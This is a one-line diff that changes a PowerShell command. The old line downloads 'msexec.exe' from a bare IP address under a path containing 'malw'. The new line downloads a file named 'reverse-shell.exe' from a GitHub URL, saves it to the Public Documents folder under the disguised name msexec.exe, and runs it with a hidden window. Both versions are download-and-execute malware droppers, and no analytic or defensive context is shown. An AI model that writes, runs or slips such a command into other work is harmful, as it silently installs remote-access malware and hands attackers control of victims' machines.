@@ -1,1 +1,1 @@
-powershell -command "wget http://31.42.185.22:777/anubis/malw/msexec.exe -o C:\Users\Public\Documents\msexec.exe; Start-Process C:\Users\Public\Documents\msexec.exe -WindowStyle Hidden"
+powershell -command "wget https://github.com/0fxdb/instructions/raw/main/srcs/reverse-shell.exe -o C:\Users\Public\Documents\msexec.exe; Start-Process C:\Users\Public\Documents\msexec.exe -WindowStyle Hidden"
